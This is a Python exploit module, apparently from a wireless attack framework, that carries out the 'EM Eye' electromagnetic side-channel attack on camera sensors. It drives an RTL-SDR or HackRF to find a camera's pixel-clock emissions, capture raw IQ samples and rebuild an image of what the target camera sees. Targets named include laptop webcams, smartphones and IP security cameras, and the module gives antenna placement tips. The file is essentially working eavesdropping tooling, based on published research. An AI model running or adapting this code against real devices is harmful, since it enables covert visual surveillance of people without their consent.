# Author: André Henrique (LinkedIn/X: @mrhenrike)
import os
import shutil
import struct
import subprocess
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """EM Eye: Camera Sensor Electromagnetic Emanation Exfiltration.

    Captures electromagnetic emanations from camera sensors (CMOS/CCD)
    in IoT devices, laptops, and smartphones to reconstruct the image
    being captured.  Camera data lines produce EM emissions at
    frequencies related to the pixel clock; these can be received by
    an SDR with a near-field antenna positioned close to the target
    device.

    Based on the research "EM Eye: Characterizing Electromagnetic
    Side-channel Eavesdropping on Embedded Cameras" (Long et al., 2024).

    Hardware necessario:
      - RTL-SDR V3 ou HackRF One como receptor SDR
      - Antena near-field (sonda de campo proximo H-field ou loop magnetica
        compacta para frequencias 100 MHz-1 GHz)
      - Posicionamento proximo ao dispositivo alvo (< 1m tipicamente)
      - (Opcional) Amplificador de baixo ruido (LNA)

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "EM Eye Camera Sensor Emanation Exfiltration",
        "description": (
            "Captures EM emanations from camera sensors (CMOS/CCD) to "
            "reconstruct the image being captured by the target device.  "
            "Passive side-channel attack.  Hardware: RTL-SDR V3 (ou HackRF) "
            "+ antena near-field (sonda H-field loop magnetica) posicionada "
            "a menos de 1m do alvo.  Opcional: LNA."
        ),
        "authors": (
            "Long et al. (EM Eye, 2024)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://www.usenix.org/conference/usenixsecurity24/presentation/long",
            "https://em-eye.github.io/",
        ),
        "disclosure_date": "2024-01-01",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "IoT cameras with CMOS sensors (Raspberry Pi Camera, etc.)",
            "Laptop webcams (thin shielding, strong emanations)",
            "Smartphone cameras (close proximity required)",
            "IP security cameras with unshielded ribbon cables",
        ),
    }

    target = OptIP("", "Not used (passive EM capture)")
    port = OptPort(1, "Not used (passive EM capture)")
    timeout = OptFloat(10.0, "Capture duration in seconds")
    center_freq = OptFloat(250e6, "Center frequency in Hz (camera pixel clock)")
    sample_rate = OptFloat(2.4e6, "SDR sample rate in sps")
    gain = OptFloat(45.0, "SDR gain in dB (higher for near-field)")
    sdr_device = OptString("rtlsdr", "SDR device: rtlsdr, hackrf")
    output_dir = OptString("/tmp/em_eye", "Output directory")
    cam_width = OptInteger(640, "Estimated camera horizontal resolution")
    cam_height = OptInteger(480, "Estimated camera vertical resolution")
    cam_fps = OptFloat(30.0, "Estimated camera frame rate")
    freq_scan = OptBool(False, "Scan frequency range to find camera pixel clock")
    freq_start = OptFloat(100e6, "Frequency scan start (Hz)")
    freq_end = OptFloat(500e6, "Frequency scan end (Hz)")
    freq_step = OptFloat(5e6, "Frequency scan step (Hz)")

    _SDR_TOOLS = {
        "rtlsdr": "rtl_power",
        "hackrf": "hackrf_sweep",
    }

    def _find_sdr_tool(self) -> str | None:
        dev = str(self.sdr_device)
        if dev == "rtlsdr":
            for t in ("rtl_sdr", "rtl_power"):
                if shutil.which(t):
                    return t
        elif dev == "hackrf":
            for t in ("hackrf_transfer", "hackrf_sweep"):
                if shutil.which(t):
                    return t
        return None

    def _find_capture_tool(self) -> str | None:
        dev = str(self.sdr_device)
        tool_name = "rtl_sdr" if dev == "rtlsdr" else "hackrf_transfer"
        return tool_name if shutil.which(tool_name) else None

    def _scan_frequencies(self) -> float | None:
        """Scan a frequency range to find the camera pixel clock harmonic."""
        dev = str(self.sdr_device)
        scan_tool = self._SDR_TOOLS.get(dev)
        if not scan_tool or not shutil.which(scan_tool):
            return None

        scan_file = os.path.join(str(self.output_dir), "freq_scan.csv")

        if dev == "rtlsdr":
            cmd = [
                scan_tool,
                "-f", f"{int(self.freq_start)}:{int(self.freq_end)}:{int(self.freq_step)}",
                "-g", str(int(self.gain)),
                "-i", "1",
                "-1",
                scan_file,
            ]
        else:
            cmd = [
                scan_tool,
                "-f", f"{int(self.freq_start)}:{int(self.freq_end)}",
                "-w", str(int(self.freq_step)),
                "-r", scan_file,
            ]

        try:
            subprocess.run(cmd, capture_output=True, timeout=30)
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return None

        if not os.path.exists(scan_file):
            return None

        # Find the frequency bin with maximum power (likely the pixel clock)
        max_power = float("-inf")
        best_freq = self.center_freq
        try:
            with open(scan_file) as f:
                for line in f:
                    parts = line.strip().split(",")
                    if len(parts) < 3:
                        continue
                    try:
                        freq = float(parts[0]) if "." in parts[0] else float(parts[2])
                        power = float(parts[-1])
                        if power > max_power:
                            max_power = power
                            best_freq = freq
                    except (ValueError, IndexError):
                        continue
        except OSError:
            return None

        return best_freq

    def _capture_iq(self, output_file: str) -> bool:
        tool = self._find_capture_tool()
        if not tool:
            return False

        dev = str(self.sdr_device)
        if dev == "rtlsdr":
            cmd = [
                tool,
                "-f", str(int(self.center_freq)),
                "-s", str(int(self.sample_rate)),
                "-g", str(int(self.gain)),
                "-n", str(int(self.sample_rate * self.timeout)),
                output_file,
            ]
        else:
            cmd = [
                tool,
                "-r", output_file,
                "-f", str(int(self.center_freq)),
                "-s", str(int(self.sample_rate)),
                "-a", "1",
                "-l", str(int(self.gain)),
                "-n", str(int(self.sample_rate * self.timeout)),
            ]

        try:
            result = subprocess.run(cmd, capture_output=True, timeout=self.timeout + 10)
            return result.returncode == 0
        except (subprocess.TimeoutExpired, FileNotFoundError):
            return False

    def _demodulate_and_reconstruct(self, iq_data: bytes) -> list[list[int]]:
        samples = []
        for i in range(0, len(iq_data) - 1, 2):
            real = (iq_data[i] - 128) / 128.0
            imag = (iq_data[i + 1] - 128) / 128.0
            samples.append((real * real + imag * imag) ** 0.5)

        spl = int(self.sample_rate / (self.cam_height * self.cam_fps))
        frame = []
        for row in range(self.cam_height):
            start = row * spl
            end = start + spl
            if end > len(samples):
                break
            line = samples[start:end]
            pps = self.cam_width / max(len(line), 1)
            pixels = []
            for col in range(self.cam_width):
                idx = min(int(col / max(pps, 0.001)), len(line) - 1) if line else 0
                val = int(line[idx] * 255) if line else 0
                pixels.append(max(0, min(255, val)))
            frame.append(pixels)
        return frame

    def _save_pgm(self, frame: list[list[int]], path: str) -> None:
        h = len(frame)
        w = len(frame[0]) if frame else 0
        with open(path, "wb") as f:
            f.write(f"P5\n{w} {h}\n255\n".encode())
            for row in frame:
                f.write(bytes(row))

    @mute
    def check(self) -> bool:
        return self._find_sdr_tool() is not None

    def run(self) -> None:
        tool = self._find_sdr_tool()
        if tool is None:
            print_error(f"SDR tool for '{self.sdr_device}' not found")
            return

        print_success(f"SDR tool found: {tool}")
        self._exploit()

    def _exploit(self) -> None:
        os.makedirs(str(self.output_dir), exist_ok=True)

        if self.freq_scan:
            print_status(
                f"Scanning {self.freq_start / 1e6:.0f}-{self.freq_end / 1e6:.0f} MHz "
                "for camera pixel clock harmonic ..."
            )
            best = self._scan_frequencies()
            if best and best != self.center_freq:
                print_info(f"Peak found at {best / 1e6:.2f} MHz, using as center freq")
                self.center_freq = best

        iq_file = os.path.join(str(self.output_dir), "camera_capture.raw")
        print_status(
            f"Capturing at {self.center_freq / 1e6:.2f} MHz for {self.timeout}s ..."
        )
        if not self._capture_iq(iq_file):
            print_error("IQ capture failed")
            return

        if not os.path.exists(iq_file):
            print_error("Capture file not created")
            return

        with open(iq_file, "rb") as f:
            iq_data = f.read()

        print_status(f"Captured {len(iq_data)} bytes, reconstructing ...")
        frame = self._demodulate_and_reconstruct(iq_data)

        if frame:
            pgm_path = os.path.join(str(self.output_dir), "camera_frame.pgm")
            self._save_pgm(frame, pgm_path)
            print_success(f"Reconstructed camera frame saved to {pgm_path}")
            print_info(
                "Quality depends on antenna proximity and camera shielding.  "
                "Use a near-field H-loop probe at < 30cm for best results."
            )
        else:
            print_error("Reconstruction produced no data")
